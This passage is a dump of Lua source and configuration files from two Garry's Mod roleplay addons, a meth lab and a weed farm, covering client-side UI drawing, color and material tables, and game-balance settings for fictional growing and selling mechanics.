        zmlab2.PointerSystem.Data.ActionName = zmlab2.language["Equipment_Repair"]
    end,function()

        // OnLeftClick

        if not zmlab2.PointerSystem.Data.Target then return end

        net.Start("zmlab2_Equipment_Repair")
        net.WriteEntity(zmlab2.PointerSystem.Data.Target)
        net.SendToServer()
    end,function()

        // MainLogic

        // Catch the Target Data
        if IsValid(zmlab2.PointerSystem.Data.HitEntity) and zmlab2.Equipment_Classes[zmlab2.PointerSystem.Data.HitEntity:GetClass()] then
            zmlab2.PointerSystem.Data.Target = zmlab2.PointerSystem.Data.HitEntity
        else
            zmlab2.PointerSystem.Data.Target = nil
        end

        // Update PreviewModel
        if IsValid(zmlab2.PointerSystem.Data.PreviewModel) then
            if IsValid(zmlab2.PointerSystem.Data.Target) then
                zmlab2.PointerSystem.Data.PreviewModel:SetModel(zmlab2.PointerSystem.Data.Target:GetModel())
                zmlab2.PointerSystem.Data.PreviewModel:SetPos(zmlab2.PointerSystem.Data.Target:GetPos())
                zmlab2.PointerSystem.Data.PreviewModel:SetAngles(zmlab2.PointerSystem.Data.Target:GetAngles())
            else
                zmlab2.PointerSystem.Data.PreviewModel:SetModel("models/hunter/misc/sphere025x025.mdl")
                zmlab2.PointerSystem.Data.PreviewModel:SetPos(zmlab2.PointerSystem.Data.Pos)
                zmlab2.PointerSystem.Data.PreviewModel:SetAngles(zmlab2.PointerSystem.Data.Ang)
            end

            if IsValid(zmlab2.PointerSystem.Data.Target) then
                local t = (1 / zmlab2.config.Damageable[zmlab2.PointerSystem.Data.Target:GetClass()]) * zmlab2.PointerSystem.Data.Target:Health()
                zmlab2.PointerSystem.Data.MainColor = zmlab2.util.LerpColor(t, zmlab2.colors["red02"], zmlab2.colors["green03"])
            else
                zmlab2.PointerSystem.Data.MainColor = zmlab2.colors["green01"]
            end
            zmlab2.PointerSystem.Data.PreviewModel:SetColor(zmlab2.PointerSystem.Data.MainColor)
        end
    end,function()

        if IsValid(zmlab2.PointerSystem.Data.Target) then
            local pos = zmlab2.PointerSystem.Data.Target:GetPos() + Vector(0,0,50)
            local data2D = pos:ToScreen()
            local val = zmlab2.PointerSystem.Data.Target:Health()
            local max = zmlab2.config.Damageable[zmlab2.PointerSystem.Data.Target:GetClass()]
            draw.RoundedBox(0, data2D.x - 100, data2D.y - 25, 200, 50, zmlab2.colors["black03"])
            draw.SimpleText("[" .. val .. "/" .. max .. "]", zmlab2.GetFont("zmlab2_vgui_font01"), data2D.x, data2D.y, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            zmlab2.util.DrawOutlinedBox(data2D.x - 100, data2D.y - 25, 200, 50, 4, color_white)
        end
    end)
end

--PATH addons/zeros_methlab2/lua/zmlab2/frezzer/cl_frezzertray.lua:
if not CLIENT then return end
zmlab2 = zmlab2 or {}
zmlab2.FrezzerTray = zmlab2.FrezzerTray or {}

/*
    ProcessState
    0 = Empty
    1 = Liquid
    2 = Frozen
*/


function zmlab2.FrezzerTray.Initialize(FrezzerTray)
    // Fixes the tray follwing the frezzer attachments correctly
	//FrezzerTray:SetPredictable(true) BUG Causes the entity while being moved to look like its lagging
end

function zmlab2.FrezzerTray.Draw(FrezzerTray)
    if zmlab2.config.Frezzer.Tray_DisplayState and zmlab2.util.InDistance(LocalPlayer():GetPos(),FrezzerTray:GetPos(), 500) and zmlab2.Convar.Get("zmlab2_cl_drawui") == 1 then

        cam.Start3D2D(FrezzerTray:LocalToWorld(Vector(0, 0, 0.5)), FrezzerTray:LocalToWorldAngles(Angle(0, 180, 0)), 0.5)
            local state = FrezzerTray:GetProcessState()

            if state == 1 then
                surface.SetDrawColor(color_white)
                surface.SetMaterial(zmlab2.materials["icon_box01"])
                surface.DrawTexturedRectRotated(0, 0, 20, 20, 0)

                surface.SetDrawColor(color_white)
                surface.SetMaterial(zmlab2.materials["icon_cold"])
                surface.DrawTexturedRectRotated(0, 0, 15, 15, 0)
            elseif state == 2 then
                surface.SetDrawColor(color_white)
                surface.SetMaterial(zmlab2.materials["icon_box01"])
                surface.DrawTexturedRectRotated(0, 0, 20, 20, 0)

                surface.SetDrawColor(color_white)
                surface.SetMaterial(zmlab2.materials["icon_breaking"])
                surface.DrawTexturedRectRotated(0, 0, 15, 15, 0)
            end
        cam.End3D2D()
    end
end

--PATH addons/zeros_methlab2/lua/zmlab2/palette/cl_palette.lua:
if not CLIENT then return end
zmlab2 = zmlab2 or {}
zmlab2.Palette = zmlab2.Palette or {}

net.Receive("zmlab2_Palette_Update", function(len)
    zmlab2.Debug_Net("zmlab2_Palette_Update", len)
    local Palette = net.ReadEntity()

    local dataLength = net.ReadUInt(16)
    local dataDecompressed = util.Decompress(net.ReadData(dataLength))
    local MethList = util.JSONToTable(dataDecompressed)


    if MethList and istable(MethList) and IsValid(Palette) then
        if Palette.MethList == nil then
            Palette.MethList = {}
        end

        Palette.MethList = table.Copy(MethList)

        Palette.UpdateClientProps = true
    end
end)

function zmlab2.Palette.Initialize(Palette)
    Palette.MethList = {}

    Palette.Count_Y = 0
    Palette.Count_X = 0
    Palette.Count_Z = 0

    Palette.UpdateClientProps = false

    Palette.Money = zmlab2.Money.Display(0)
end

function zmlab2.Palette.Draw(Palette)
    if zmlab2.util.InDistance(Palette:GetPos(), LocalPlayer():GetPos(), 300) and zmlab2.Convar.Get("zmlab2_cl_drawui") == 1  then
        cam.Start3D2D(Palette:LocalToWorld(Vector(0, 0, 50 + 5 * Palette.Count_Z)), Angle(0, LocalPlayer():EyeAngles().y - 90, 90), 0.1)
            local boxSize = zmlab2.util.GetTextSize(Palette.Money, zmlab2.GetFont("zmlab2_font02")) * 1.5
            draw.RoundedBox(0, -boxSize / 2, -30, boxSize, 60, zmlab2.colors["black02"])
            draw.SimpleText(Palette.Money, zmlab2.GetFont("zmlab2_font02"), 0, 0, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            zmlab2.util.DrawOutlinedBox(-boxSize / 2, -30, boxSize, 60, 4, color_white)
        cam.End3D2D()
    end
end

function zmlab2.Palette.OnRemove(Palette)
    zmlab2.Palette.RemoveClientModels(Palette)
end

function zmlab2.Palette.Think(Palette)
    if zmlab2.util.InDistance(LocalPlayer():GetPos(), Palette:GetPos(), 750) then
        if Palette.UpdateClientProps == true then

            // Calculates new money value
            local money = 0
            for k,v in pairs(Palette.MethList) do
                if v == nil then continue end
                money = money + zmlab2.Meth.GetValue(v.t,v.a,v.q)
            end

            // Multiply by rank
            Palette.Money = money * (zmlab2.config.NPC.SellRanks[zmlab2.Player.GetRank(LocalPlayer())] or zmlab2.config.NPC.SellRanks["default"])

            Palette.Money = zmlab2.Money.Display(Palette.Money)

            zmlab2.Palette.UpdateClientProps(Palette)
            Palette.UpdateClientProps = false
        end
    else
        zmlab2.Palette.RemoveClientModels(Palette)
        Palette.UpdateClientProps = true
    end
end

function zmlab2.Palette.UpdateClientProps(Palette)
    zmlab2.Palette.RemoveClientModels(Palette)
    Palette.ClientProps = {}

    for k, v in pairs(Palette.MethList) do
        zmlab2.Palette.CreateClientProp(Palette, k, v.t,v.a, v.q)
    end
end

function zmlab2.Palette.CreateClientProp(Palette, id, meth_type, meth_amount,meth_quality)
    local pos = Palette:GetPos() - Palette:GetRight() * 25 - Palette:GetForward() * 36 + Palette:GetUp() * 8
    local ang = Palette:GetAngles()

    if Palette.Count_X >= 2 then
        Palette.Count_X = 1
        Palette.Count_Y = Palette.Count_Y + 1
    else
        Palette.Count_X = Palette.Count_X + 1
    end

    if Palette.Count_Y >= 4 then
        Palette.Count_Y = 0
        Palette.Count_Z = Palette.Count_Z + 1
    end

    pos = pos + Palette:GetForward() * 24 * Palette.Count_X
    pos = pos + Palette:GetRight() * 17 * Palette.Count_Y
    pos = pos + Palette:GetUp() * 12 * Palette.Count_Z

    local crate = zmlab2.ClientModel.AddProp()
    if not IsValid(crate) then return end
    crate:SetAngles(ang)
    crate:SetModel("models/zerochain/props_methlab/zmlab2_crate.mdl")
    crate:SetPos(pos)

    crate:Spawn()
    crate:Activate()

    crate:SetRenderMode(RENDERMODE_NORMAL)
    crate:SetParent(Palette)

    local MethMat = zmlab2.Meth.GetMaterial(meth_type, meth_quality)
    crate:SetSubMaterial(0, "!" .. MethMat)

    local cur_amount = meth_amount
    if cur_amount <= 0 then
        crate:SetBodygroup(0,5)
    else
        local bg = math.Clamp(5 - math.Round((5 / zmlab2.config.Crate.Capacity) * cur_amount),1,5)
        crate:SetBodygroup(0,bg)
    end

    Palette.ClientProps[id] = crate
end

function zmlab2.Palette.RemoveClientModels(Palette)
    Palette.Count_Y = 0
    Palette.Count_X = 0
    Palette.Count_Z = 0

    if (Palette.ClientProps and table.Count(Palette.ClientProps) > 0) then
        for k, v in pairs(Palette.ClientProps) do
            if IsValid(v) then
                v:Remove()
            end
        end
    end

    Palette.ClientProps = {}
end

--PATH addons/zeros_methlab2/lua/zmlab2/npc/cl_npc.lua:
if not CLIENT then return end
zmlab2 = zmlab2 or {}
zmlab2.NPC = zmlab2.NPC or {}

function zmlab2.NPC.Initialize(NPC)

end

function zmlab2.NPC.Draw(NPC)
    NPC:DrawModel()

    if zmlab2 and zmlab2.util and zmlab2.util.InDistance(NPC:GetPos(), LocalPlayer():GetPos(), 400) and zmlab2.Convar.Get("zmlab2_cl_drawui") == 1 then
        cam.Start3D2D(NPC:LocalToWorld(Vector(0, 0, 80)), Angle(0, LocalPlayer():EyeAngles().y - 90, 90), 0.1)
            draw.RoundedBox(0, -150, -30, 300, 60, zmlab2.colors["black02"])
            draw.SimpleText(zmlab2.config.NPC.Name, zmlab2.GetFont("zmlab2_font02"), 0, 0, color_white, TEXT_ALIGN_CENTER, TEXT_ALIGN_CENTER)
            zmlab2.util.DrawOutlinedBox(-150, -30, 300, 60, 4, color_white)
        cam.End3D2D()
    end
end

--PATH addons/zeros_weedfarm/lua/zweedfarm/sh/zwf_materials.lua:
AddCSLuaFile()
zwf = zwf or {}

zwf.default_materials = zwf.default_materials or {}

zwf.default_materials["square"] = Material("materials/zerochain/zwf/ui/zwf_square.png", "smooth")

zwf.default_materials["shadow_circle"] = Material("materials/zerochain/zwf/zwf_shadow_circle.png", "smooth")
zwf.default_materials["shadow_square"] = Material("materials/zerochain/zwf/ui/zwf_shadow_square.png", "smooth")
zwf.default_materials["shadow_gradient"] = Material("materials/zerochain/zwf/ui/zwf_shadow_gradient.png", "smooth")

zwf.default_materials["switch"] = Material("materials/zerochain/zwf/zwf_on_switch.png", "smooth")

zwf.default_materials["sun"] = Material("materials/zerochain/zwf/zwf_sun.png", "smooth")
zwf.default_materials["temperatur"] = Material("materials/zerochain/zwf/zwf_temperatur.png", "smooth")

zwf.default_materials["plant_happy"] = Material("materials/zerochain/zwf/zwf_plant_happy.png", "smooth")
zwf.default_materials["plant_sad"] = Material("materials/zerochain/zwf/zwf_plant_sad.png", "smooth")
zwf.default_materials["plant_harvestready"] = Material("materials/zerochain/zwf/zwf_plant_harvestready.png", "smooth")
zwf.default_materials["plant_infected"] = Material("materials/zerochain/zwf/zwf_plant_infected.png", "smooth")

zwf.default_materials["light_sprite"] = Material("sprites/light_ignorez")

zwf.default_materials["button_wide"] = Material("materials/zerochain/zwf/ui/zwf_button.png", "smooth")
zwf.default_materials["button_base"] = Material("materials/zerochain/zwf/ui/zwf_button_base.png", "smooth")
zwf.default_materials["button_shine"] = Material("materials/zerochain/zwf/ui/zwf_button_shine.png", "smooth")
zwf.default_materials["button_select"] = Material("materials/zerochain/zwf/ui/zwf_button_select.png", "smooth")
zwf.default_materials["button_circle"] = Material("materials/zerochain/zwf/zwf_button_circle.png", "smooth")

zwf.default_materials["tablet_interface"] = Material("materials/zerochain/zwf/ui/zwf_tablet_interface.png", "smooth")

zwf.default_materials["clock_base"] = Material("materials/zerochain/zwf/zwf_clock_base.png", "smooth")
zwf.default_materials["clock_pointer"] = Material("materials/zerochain/zwf/zwf_clock_pointer.png", "smooth")

zwf.default_materials["weed_indicator"] = Material("materials/zerochain/zwf/zwf_weed_indicator.png", "smooth")
zwf.default_materials["illegal_indicator"] = Material("materials/zerochain/zwf/zwf_illegal_indicator.png", "smooth")

zwf.default_materials["blur"] =  Material("pp/blurscreen")

zwf.default_materials["icon_growtime"] = Material("materials/zerochain/zwf/zwf_time.png", "smooth")
zwf.default_materials["icon_thc"] = Material("materials/zerochain/zwf/zwf_weed.png", "smooth")
zwf.default_materials["icon_mass"] = Material("materials/zerochain/zwf/zwf_mass.png", "smooth")

zwf.default_materials["symbol_weed"] = Material("materials/zerochain/zwf/ui/zwf_weed.png", "smooth")
zwf.default_materials["symbol_cancel"] = Material("materials/zerochain/zwf/ui/zwf_cancel.png", "smooth")
zwf.default_materials["symbol_bong"] = Material("materials/zerochain/zwf/ui/zwf_bong.png", "smooth")

zwf.default_materials["weedbuyer"] = Material("materials/zerochain/zwf/ui/zwf_weedbuyer.png", "smooth")


zwf.default_colors = zwf.default_colors or {}

zwf.default_colors["black01"] = Color(0, 0, 0, 150)
zwf.default_colors["black02"] = Color(0,0,0,255)
zwf.default_colors["black03"] = Color(0,0,0,200)
zwf.default_colors["black04"] = Color(35,35,35)
zwf.default_colors["black05"] = Color(0, 0, 0, 125)
zwf.default_colors["black06"] = Color(0, 0, 0, 100)
zwf.default_colors["black07"] = Color(0, 0, 0, 55)
zwf.default_colors["black08"] = Color(0, 0, 0, 225)
zwf.default_colors["black09"] = Color(0, 0, 0, 175)

zwf.default_colors["gray01"] = Color(55,55,55)
zwf.default_colors["gray02"] = Color(75,75,75)
zwf.default_colors["gray03"] = Color(75,75,75,75)


zwf.default_colors["power"] = Color(255, 150, 75)
zwf.default_colors["water"] = Color(34, 91, 150)
zwf.default_colors["cable"] = Color(200, 200, 200)


zwf.default_colors["red01"] = Color(200,125,125)
zwf.default_colors["red02"] = Color(125,75,75)
zwf.default_colors["red03"] = Color(255,125,125,255)
zwf.default_colors["red04"] = Color(255, 75, 75)
zwf.default_colors["red05"] = Color(247, 80, 68)
zwf.default_colors["red06"] = Color(195, 72, 72, 255)

zwf.default_colors["orange01"] = Color(255,125,55)
zwf.default_colors["orange02"] = Color(219,182,104)
zwf.default_colors["orange03"] = Color(225,175,75)
zwf.default_colors["orange04"] = Color(195, 162, 72, 255)

zwf.default_colors["orange05"] = Color(200,167,95)
zwf.default_colors["orange06"] = Color(253,208,113)


zwf.default_colors["blue01"] = Color(75, 155, 255)



zwf.default_colors["violett01"] = Color(84,70,97,255)
zwf.default_colors["violett02"] = Color(132, 104, 161,200)
zwf.default_colors["violett03"] = Color(159, 104, 215)


zwf.default_colors["yellow01"] = Color(255,200,0,255)
zwf.default_colors["yellow02"] = Color(195, 162, 72, 255)


zwf.default_colors["green01"] = Color(92,125,56)
zwf.default_colors["green02"] = Color(125, 200, 125)
zwf.default_colors["green03"] = Color(75,125,75)
zwf.default_colors["green04"] = Color(75, 150, 75)
zwf.default_colors["green05"] = Color(103, 171, 84, 255)
zwf.default_colors["green06"] = Color(125,255,125,255)
zwf.default_colors["green07"] = Color(162, 195, 72, 255)
zwf.default_colors["green08"] = Color(40, 255, 40, 15)
zwf.default_colors["green09"] = Color(122,152,83,255)
zwf.default_colors["green10"] = Color(164,207,108,255)

zwf.default_colors["white01"] = Color(255,255,255)
zwf.default_colors["white02"] = Color(255,255,255,55)
zwf.default_colors["white03"] = Color(255,255,255,15)
zwf.default_colors["white04"] = Color(255,255,255,150)
zwf.default_colors["white05"] = Color(200,200,200,255)
zwf.default_colors["white06"] = Color(255,255,255,125)

--PATH addons/zeros_weedfarm/lua/zwf_config_main.lua:
zwf = zwf or {}
zwf.f = zwf.f or {}
zwf.config = zwf.config or {}

/////////////////////////////////////////////////////////////////////////////

// Bought by 76561198131102749
// Version 1.6.1

/////////////////////////// Zeros GrowOP /////////////////////////////

// Developed by ZeroChain:
// http://steamcommunity.com/id/zerochain/
// https://www.artstation.com/zerochain
// https://www.gmodstore.com/users/view/76561198013322242


/////////////////////////////////////////////////////////////////////////////


/*
    Console Commands:

    // Adds a seed with the provided data to the seedbank or player you are looking at
    zwf_addseed Weed_ID Weed_Name GrowTime GrowAmount THC
        Weed_ID = The id of the plant zwf.config.Plants
        Weed_Name = The name of the plant (This should not have spaces!)
        GrowTime = Grow Time in seconds
        GrowAmount = How much weed it produces if grown perfectly
        THC = How much thc the weed has
*/



// This enables the Debug Mode
zwf.config.Debug = false

// Switches between FastDl and Workshop
zwf.config.EnableResourceAddfile = false

// The language , en , de , es , fr , ru , pl , cn , ptbr
zwf.config.SelectedLanguage = "ru"

// Currency
zwf.config.Currency = "$"

// Unit of weight
zwf.config.UoW = "g"

// Unit of Liquid
zwf.config.UoL = "l"

// These Ranks are allowed to use the debug commands and save the WeedBuyer NPC with !savezwf
// If xAdmin or SAM is installed then this table will be ignored
zwf.config.AdminRanks = {
    ["superadmin"] = true,
    ["owner"] = true,
}

// Those job can sell weed and interact with the grow entities (Leave empty to allow everyone to sell weed)
zwf.config.Jobs = {
    [TEAM_DRUG] = true,
}

// What entities should have the player be the CPPI Owner (This allows them to move the entities via physgun)
zwf.config.CPPI = {
    ["zwf_lamp"] = true,
    ["zwf_pot"] = true,
    ["zwf_pot_hydro"] = true,
    ["zwf_ventilator"] = true,
    ["zwf_drystation"] = true,
    ["zwf_watertank"] = true,
    ["zwf_outlet"] = true,
    ["zwf_mixer"] = true,
    ["zwf_oven"] = true,
    ["zwf_mixer_bowl"] = true,
    ["zwf_packingstation"] = true,
    ["zwf_seed_bank"] = true,
    ["zwf_splice_lab"] = true,
    ["zwf_soil"] = true,
    ["zwf_generator"] = true,
    ["zwf_bong_ent"] = true,
    ["zwf_joint_ent"] = true,
    ["zwf_bong01_ent"] = true,
    ["zwf_bong02_ent"] = true,
    ["zwf_bong03_ent"] = true
}

// When changing to these jobs the script wont remove the players weed entities so he can continue growing weed later.
zwf.config.StaffOnDuty = {
    //[TEAM_STAFFONDUTY] = true
}

zwf.config.Player = {
    // If zwf.config.NPC.SellMode = 2 then we Drop the weedblocks when the player dies.
    DropWeedOnDeath = false,
}

// Vrondakis LevelSystem
// This code can be found at lua/zweedfarm/sv/zwf_hooks_sv.lua zwf_OnWeedSold_Vrondakis
zwf.config.VrondakisLevelSystem = {
    Enabled = false,
    XP = {
        ["Selling"] = 15, // XP Per WeedBlock
    }
}

// The Damage the entitys have do take before they get destroyed.
// Setting it to -1 disables it
zwf.config.Damageable = {
    ["zwf_plant"] = 100,
    ["zwf_watertank"] = 100,
    ["zwf_drystation"] = 100,
    ["zwf_fuel"] = 100,
    ["zwf_generator"] = 100,
    ["zwf_lamp"] = 100,
    ["zwf_nutrition"] = 100,
    ["zwf_outlet"] = 100,
    ["zwf_packingstation"] = 100,
    ["zwf_palette"] = 100,
    ["zwf_pot"] = 100,
    ["zwf_pot_hydro"] = 100,
    ["zwf_seed"] = 100,
    ["zwf_seed_bank"] = 100,
    ["zwf_soil"] = 100,
    ["zwf_splice_lab"] = 100,
    ["zwf_ventilator"] = 100,
    ["zwf_autopacker"] = 100,
    ["zwf_weedblock"] = 50,
    ["zwf_weedstick"] = 50,
    ["zwf_jar"] = 50,
}

// This only applies to player who are defined as weed sellers in zwf.config.NPC.WeedSellers
zwf.config.Sharing = {
    // Do we allow seeds to be shared and used by other players?
    // *Note: Enabling this will allow players to take anyones seed and store / use it
    Seeds = true,

    // Do we allow other players to share Fertilizer bottles?
    Fertilizer = true,

    // Do we allow other players to interact with the plants?
    Plants = true,

    // Do we allow other players to remove weed junks from the drying station?
    DryStation = true,

    // Do we allow other players to interact with the packing table?
    Packing = true,

    // Do we allow weedblocks from other players to be added to our palette entity?
    Palette = true,

    // Do we allow other players to add/remove weed and interact with our seedlab entity?
    SeedLab = false,

    // Do we allow other players to interact with the generator?
    Generator = true,

    // Do we allow other players to interact with the lamps?
    Lamps = true,

    // Do we allow other players to interact with the fans?
    Fans = true,

    // Do we allow other players to interact with your Watertank?
    WaterTank = true,
}

zwf.config.ShopTablet = {
    // How much money does the player gets refuned if he sells his bought equipment with the Reload key on the TabletSWEP
    // 1 = full, 0.5 = half , 0 = disabled
    refund = 0.5
}

zwf.config.Wind = {
    // Known Bugs:
    // Can cause a render flicker issue when shining a flashlight on them.

    // Do we want to spawn a wind entity on map load
    // *Note: This will make the plants move more realistically.
    Enabled = true,

    // Some options for the wind entity
    //https://developer.valvesoftware.com/wiki/Env_wind

    gustdirchange = 30,
    gustduration = 4,
    maxgust = 30,
    mingust = 15,
    maxgustdelay = 30,
    mingustdelay = 15,
    maxwind = 64,
    minwind = 16,
}

zwf.config.THC = {

    // The maximal THC Level weed can have.
    Max = 50,

    // How much can the THC level of the plant increase if grown perfectly, aka Good Balance of water and low Temperatur
    MaxIncrease = 3,

    // How much does the THC level of the weed influence the price
    // 0.25 = +25% More Money, 2 = 200% more money
    // Examble: A infuence value of 0.5 would give 50% more money if the THC level of the weed would be full Maxed out, ( Full maxed out means a THC level of zwf.config.THC.Max)
    sellprice_influence = 0.5,
}

--PATH addons/zeros_weedfarm/lua/zwf_config_growing.lua:
zwf = zwf or {}
zwf.f = zwf.f or {}
zwf.config = zwf.config or {}



zwf.config.Cable = {
    // The maximal distance between entities before the cable breaks.
    distance = 300,

    // How often should we try to Transfer Water/Power to connected entities.
    transfer_interval = 2, // seconds
}

zwf.config.WateringCan = {
    // How much water can it hold
    Capacity = 100,

    // How much water gets filled from the waterTank to the WateringCan per click
    Transfer_Amount = 5,
}

zwf.config.WaterTank = {
    // How much water can the tank hold.
    Capacity = 1000,

    // How much money does it cost to refill the waterTank per liter
    RefillCostPerUnit = 2,
}

zwf.config.Generator = {
    // How much fuel does it hold
    Fuel_Capacity = 200,

    // How much fuel does it use every 5 seconds
    Fuel_usage = 1,

    // If the generator is in idle mode because its power wont get used then we stop using fuel aswell
    Fuel_SpareBenefit = false,

    // Here we can tell the generator what entities can be used for fuel and what value inside the entities defines the amount
    Fuel_Ents = {
        ["zwf_fuel"] = function(ent)
            return ent.FuelAmount
        end,
        ["vc_pickup_fuel_diesel"] = function(ent)
            return ent.VC_Storage
        end,
        ["vc_pickup_fuel_petrol"] = function(ent)
            return ent.VC_Storage
        end,
    },


    // The max amount of tries the player could need to start the generator.
    Max_StartTrys = 4,

    // How often does it convert fuel to power in seconds
    Power_intarval = 1,

    // How much power does it produce per interval
    Power_production = 25,

    // How much power can the generator store
    Power_storage = 100,


    // Does the Generator gets broken over time and needs maintance?
    Maintance = true,

    // How many seconds of usage before the Generator needs to be repaired
    Maintance_time = 750,

    // The time before the generator explodes
    Maintance_countdown = 20
}

zwf.config.Outlet = {
    Power_storage = 10,
}

zwf.config.Lamps = {
    [1] = {
        name = "Sodium Lamp",

        model = "models/zerochain/props_weedfarm/zwf_lamp01.mdl",

        // How much energy it can store
        Power_storage = 10,

        // How much energy it uses
        Power_usage = 2,

        // How much heat it inflicts on the plant
        Heat = 10,

        // The color of the light
        light_color = Color(235,205,165,255),
    },
    [2] = {
        name = "LED Lamp",
        model = "models/zerochain/props_weedfarm/zwf_lamp02.mdl",
        Power_storage = 25,
        Power_usage = 4,
        Heat = 0,
        light_color = Color(231,128,218,255),
    },
}

zwf.config.Ventilator = {
    // Amount of power that can be stored
    Power_storage = 10,

    // How much energy it uses
    Power_usage = 2,

    // The Temp decrease
    Cooling = 7,
}



zwf.config.Seeds = {
    // The number of seeds a seedbox can hold.
    Count = 5,

    // How many seedbox entities can the player spawn
    ent_limt = 3,
}

zwf.config.SeedBank = {

    // How many seeds can be stored in the seedbank
    Limit = 25,
}

zwf.config.SeedLab = {

    // How long does it take to make a new seed
    SpliceTime = 100,
}



zwf.config.Flowerpot = {
    // How much water can the flowerpot hold
    Water_Capacity = 100,
}

zwf.config.Growing = {
    // The maximal THC Level a plant can produce
    max_thc = 50, // %

    // The shortest duration a plant can grow (This should not be smaller then the shortest growtime defined in zwf.config.Plants)
    min_duration = 180, // seconds

    // The maximal Weed Amount a plant can produce
    // *Note: This can be reached by increasing the YieldAmount via NutritionBoost, SeedLab Inheritance or if enabled after the Plant has fully grown in PostGrow
    max_amount = 800,


    // How long has the plant to be unhappy before it dies.
    kill_time = 60,

    PostGrow = {
        // Do we want the plants to keep growing after they finished their growcycle
        Enabled = true,

        // The interval at which we increase the weed amount in seconds
        increment_interval = 30,

        // How much weed gets added
        increment_amount = 10 //g
    }
}

zwf.config.Nutrition = {
    [1] = {
        name = "Hyper Viper", // Name of the nutrition mix
        skin = 1, // The skin for the model
        boost = {
            [1] = {
                b_type = 1, // The type of boost , 1 = Speed, 2 = WeedAmount, 3 = Plague Protection
                b_amount = 5 // Boostamount in % [1-100]
            },
        }
    },
    [2] = {
        name = "Haze of Light",
        skin = 0,
        boost = {
            [1] = {
                b_type = 1,
                b_amount = 15
            },
        }
    },


    [3] = {
        name = "Fat Harvest",
        skin = 2,
        boost = {
            [1] = {
                b_type = 2,
                b_amount = 5
            },
        }
    },
    [4] = {
        name = "MEGA Harvest",
        skin = 3,
        boost = {
            [1] = {
                b_type = 2,
                b_amount = 15
            },
        }
    },

    [5] = {
        name = "Rapid Rabbit Mix",
        skin = 4,
        boost = {
            [1] = {
                b_type = 1,
                b_amount = 3
            },
            [2] = {
                b_type = 2,
                b_amount = 3
            },
            [3] = {
                b_type = 3,
                b_amount = 50
            }
        }
    },
    [6] = {
        name = "Get Schwifty Mix",
        skin = 5,
        boost = {
            [1] = {
                b_type = 1,
                b_amount = 8
            },
            [2] = {
                b_type = 2,
                b_amount = 8
            },
            [3] = {
                b_type = 3,
                b_amount = 100 // 100% for this boost type means the plant will never get sick
            }
        }
    },
}

zwf.config.Plague = {
    // Do we want to enable the Plague System which infects plants overtime
    Enabled = true,

    // The interval at which we roll a dice if the plant should get infected
    infect_interval = 75, // in seconds

    // How high is the chance that the plant gets infected
    infect_chance = 30, // %

    // How long after the last infection till the plant can get infected again
    infect_cooldown = 30
}

zwf.config.Plants = {
    [1] = {
        // The name of the plant
        name = "O.G. Kush",

        // The model skin
        skin = 0,

        // The sell value per full weed block
        // *Note: A full weedblock is made out of 4 Full Jars of weed so if the weedblock got made out of 4 half jars of weed then this sell value will be half aswell
        sellvalue = 2500,

        // The default THC level in %
        thc_level = 10,

        // The screeneffect that should display when smoking the weed
        high_effect = 1,

        // The music that should play while high (This starts inside the sound folder so you dont need to write "sound" in front of your path)
        high_music = nil, // path/to/the/musicfile.wav // Examble: "music.wav"

        // The theme color for this weed
        color = Color(179,196,121,255),

        cut_effect = "zwf_cutting01",
        pack_effect = "zwf_packing01",
        death_effect = "zwf_death01",

        Grow = {
            // How long it takes to grow
            Duration = 200,

            // This value defines the Difficulty for growing the plant, higher values mean its gonna use up faster Water
            Difficulty = 1, // [1 - 10]

            // How much weed can this plant produce if grown perfectly
            MaxYieldAmount = 250,
        },
    },
    [2] = {
        name = "Bubba Kush",
        skin = 2,
        sellvalue = 5000,
        thc_level = 12,
        high_effect = 2,
        high_music = nil,
        color = Color(126,220,208,255),
        cut_effect = "zwf_cutting01",
        pack_effect = "zwf_packing01",
        death_effect = "zwf_death01",
        Grow = {
            Duration = 225,
            Difficulty = 2,
            MaxYieldAmount = 150,
        },
    },
    [3] = {
        name = "Sour Diesel",
        skin = 3,
        sellvalue = 7500,
        thc_level = 14,
        high_effect = 3,
        high_music = nil,
        color = Color(220,216,169,255),
        cut_effect = "zwf_cutting03",
        pack_effect = "zwf_packing03",
        death_effect = "zwf_death03",
        Grow = {
            Duration = 250,
            Difficulty = 5,
            MaxYieldAmount = 125,
        },
    },
    [4] = {
        name = "AK-47",
        skin = 4,
        sellvalue = 8000,
        thc_level = 16,
        high_effect = 4,
        high_music = nil,
        color = Color(190,214,174,255),
        cut_effect = "zwf_cutting01",
        pack_effect = "zwf_packing01",
        death_effect = "zwf_death01",
        Grow = {
            Duration = 300,
            Difficulty = 6,
            MaxYieldAmount = 125,
        },
    },
    [5] = {
        name = "Super Lemon Haze",
        skin = 5,
        sellvalue = 10000,
        thc_level = 20,
        high_effect = 5,
        high_music = nil,
        color = Color(240,222,118,255),
        cut_effect = "zwf_cutting03",
        pack_effect = "zwf_packing03",
        death_effect = "zwf_death03",
        Grow = {
            Duration = 400,
            Difficulty = 7,
            MaxYieldAmount = 100,
        },
    },
    [6] = {
        name = "Strawberry Cough",
        skin = 6,
        sellvalue = 10500,
        thc_level = 25,
        high_effect = 6,
        high_music = nil,
        color = Color(217,82,54,255),
        cut_effect = "zwf_cutting02",
        pack_effect = "zwf_packing02",
        death_effect = "zwf_death02",
        Grow = {
            Duration = 500,
            Difficulty = 8,
            MaxYieldAmount = 100,
        },
    },
    [7] = {
        name = "Dark Devil",
        skin = 1,
        sellvalue = 11000,
        thc_level = 30,
        high_effect = 7,
        high_music = nil,
        color = Color(233,120,184,255),
        cut_effect = "zwf_cutting02",
        pack_effect = "zwf_packing02",
        death_effect = "zwf_death02",
        Grow = {
            Duration = 600,
            Difficulty = 9,
            MaxYieldAmount = 100,
        },
    },
}

--PATH addons/zeros_weedfarm/lua/zwf_config_effects.lua:
zwf = zwf or {}
zwf.f = zwf.f or {}
zwf.config = zwf.config or {}

zwf.config.HighEffect = {

    // How long is the player high when smoking 1 hit of weed
    //*Note The effect duration can increase when smoking large amount of weed. The Effect intensity is defined by the THC amount of the weed.
    DefaultEffect_Duration = 2,

    // The maximal duration a effect can has in seconds.
    MaxDuration = 60,

    Effects = {
        [1] = {
            // The display materials
            mat = "zerochain/zwf/effect/zwf_high_effect01",

            // The refract material
            warp_mat = "zerochain/zwf/effect/zwf_high_effect01_warp",

            // The Bloom Color
            bloom = {0.729, 0.462, 0.125},

            // The DrawColorModify data
            colormodify = {

                ["pp_colour_addr"] = 0.729,
                ["pp_colour_addg"] = 0.462,
                ["pp_colour_addb"] = 0.125,

